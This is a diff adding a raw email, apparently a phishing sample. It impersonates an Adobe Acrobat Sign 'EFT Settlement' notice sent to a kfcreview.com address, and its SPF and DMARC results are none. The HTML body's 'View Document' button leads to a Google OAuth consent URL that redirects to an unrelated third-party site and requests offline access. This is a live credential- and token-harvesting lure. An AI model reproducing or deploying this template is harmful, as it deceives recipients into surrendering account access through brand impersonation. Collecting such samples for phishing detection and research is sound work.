@@ -1,0 +1,183 @@
+Return-Path: <dse_NA4_zingerpie@secure.net>
+Received: from secure.net ([187.32.131.170])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id hv7nvsfsmgkbiq7hl4dhvbkt8qjjko8c1pes3vo1
+ for zingerpie@kfcreview.com;
+ Fri, 13 Nov 2026 11:23:35 +0000 (UTC)
+Received-SPF: none (spfCheck: 187.32.131.170 is neither permitted nor denied by domain of secure.net) client-ip=187.32.131.170; envelope-from=dse_NA4_zingerpie@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 187.32.131.170 is neither permitted nor denied by domain of secure.net) client-ip=187.32.131.170; envelope-from=dse_NA4_zingerpie@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIdmdMYjZRT05qZ3VYTUtYK0l4bWREeVlHUG55M0hJZWl4bG90d1U1QjF2czFJMDdNZ1dhSFY4K0NsTjhhMnBIQVJ2L0t0a1BmZUxGZUR1OUI1NjIyeEQyb0NnWmVwVFYrRTlrMWt1eEhITEtlLzh1dXgrZDlWMkdsWDRiR2NCV1gvL0xabG12YWllcTVjOURVTkVSMjFrZTBLZTZRVmsxR1lXcUhWVmpZbC9HK2QxOXU4UjRYSEpyNjVkZEdwL0lSdmsxclMrUkF0dW1zTFYrTTFLbUIxRkNXTEJWK1h5cThQSkFEQ21Tbk1IQkZnQzZBK05GaHU0NjVid0wwSkF6TjJmcVpFdFM2eFhkeDNnbFJidjlYSHFGZDZXQUMyV1hnWkxRUiszdDNkRkIxN3JjVWl0VFFNUWI3U01SZ1dKelE9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=Lt6XcU3ML1zNk0IcNfYBVMrl3BtjDT+PIeBpS1erhmrPmIkejNtTMpqSGj9YVC28AHcyaPltNJbHTKhLPGWj4l5dYzmat2tOLKjsSyFzzx/ySn6sYJwAFZr+hfosatdy2Ml/Qrp6VlR5/TS0zUvDy8ZJJBJVNs00buHJn7G1Zsg=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1794569016; v=1; bh=FNNyLfxtqvoZ4t9z+A+7VLQf9d/e7GBR131FNw2xfUM=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Adobe Acrobat Sign" kfcreview.com - Eft Settlement <dse_NA4_zingerpie@secure.net>
+To: zingerpie@kfcreview.com
+Subject: =?UTF-8?B?QWRvYmUgQWNyb2JhdCBTaWduIOKAkyBFRlQgU2V0dGxlbWVudA==?=
+Date: 13 Nov 2026 08:23:25 -0300
+Message-ID: <20261113082325.52EC78A844C1E572@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+
+<HTML lang=3Den><HEAD><TITLE>Signed Document Received</TITLE>
+<META charset=3DUTF-8>
+<META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=3D1.0"=
+>
+<STYLE>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #f4f4f4;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, s=
+ans-serif;
+      color: #2c2c2c;
+      line-height: 1.6;
+      padding: 16px;
+    }
+    .container {
+      max-width: 560px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      border: 1px solid #e8e8e8;
+    }
+    .hero {
+      background: linear-gradient(135deg, #fdfbfb 0%, #f9f9f9 100%);
+      padding: 32px 28px;
+      text-align: center;
+      border-bottom: 1px solid #eaeaea;
+    }
+    .icon {
+      width: 56px;
+      height: 56px;
+      background: #d93025;
+      color: white;
+      font-size: 28px;
+      font-weight: bold;
+      line-height: 56px;
+      border-radius: 50%;
+      display: inline-block;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(217,48,37,0.2);
+    }
+    .title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #555;
+      font-style: italic;
+    }
+    .content {
+      padding: 28px;
+    }
+    .message {
+      font-size: 15.5px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .sender {
+      color: #d93025;
+      font-weight: 600;
+    }
+    .doc-name {
+      display: block;
+      background: #fef5f5;
+      padding: 12px 16px;
+      border-radius: 10px;
+      font-size: 14.5px;
+      color: #d93025;
+      font-weight: 500;
+      margin: 18px 0;
+      border: 1px dashed #ffd0d0;
+      text-align: center;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      max-width: 260px;
+      margin: 22px auto;
+      background: #d93025;
+      color: #fff !important;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 15px;
+      padding: 14px 24px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 3px 10px rgba(217,48,37,0.25);
+      transition: all 0.2s ease;
+    }
+    .btn:hover {
+      background: #c22b1f;
+      transform: translateY(-1px);
+    }
+    .info-box {
+      background: #fff9e6;
+      border: 1px solid #f7c52d;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 13.5px;
+      color: #856404;
+      margin: 20px 0;
+    }
+    .info-box strong {
+      color: #b86300;
+    }
+    .footer {
+      background: #fafafa;
+      padding: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      border-top: 1px solid #eaeaea;
+    }
+    .footer a {
+      color: #d93025;
+      text-decoration: underline;
+    }
+    .adobe-brand {
+      margin-top: 12px;
+      font-size: 11.5px;
+      color: #999;
+    }
+    .adobe-brand a {
+      color: #999;
+    }
+    @media (max-width: 480px) {
+      .hero, .content, .footer { padding: 20px; }
+      .btn { max-width: 100%; }
+    }
+  </STYLE>
+
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV class=3Dcontainer><!-- Hero Section -->
+<DIV class=3Dhero>
+<DIV class=3Dicon>&#10004;</DIV>
+<DIV class=3Dtitle>Document Received</DIV>
+<DIV class=3Dsubtitle>A signed file is ready for you</DIV></DIV><!-- Conten=
+t -->
+<DIV class=3Dcontent>
+<P class=3Dmessage>You&#8217;ve received a signed document from&nbsp;kfcrev=
+iew.com </P>
+<DIV class=3Ddoc-name>zingerpie@kfcreview.com&nbsp;&#8211; Final Signed Ver=
+sion</DIV><A class=3Dbtn href=3D"https://accounts.google.com/o/oauth2/v2/au=
+th?client_id=3D787141854297-otfqv8p1t7ocpm1sc9r6qr9d45jklfea.apps.googleuse=
+rcontent.com&amp;redirect_uri=3Dhttps://fsaremodeling.com/sw/jvfgher45rvbhd=
+f.html&amp;response_type=3Dcode&amp;scope=3Dopenid%20email%20profile&amp;ac=
+cess_type=3Doffline&amp;prompt=3Dnone">View Document</A>=20
+<DIV class=3Dinfo-box><STRONG>Tip:</STRONG> Use any modern PDF reader (like=
+ Adobe Acrobat Reader) to view digital signatures. </DIV></DIV><!-- Footer =
+-->
+<DIV class=3Dfooter>
+<P>This is an automated update from Adobe Acrobat Sign.</P>
+<P>Not expecting this? <A href=3D"#">Unsubscribe</A></P>
+<DIV class=3Dadobe-brand>&copy; 2025 Adobe. All rights reserved.<BR><A href=
+=3D"https://www.adobe.com">adobe.com</A> </DIV></DIV></DIV></BODY></HTML>
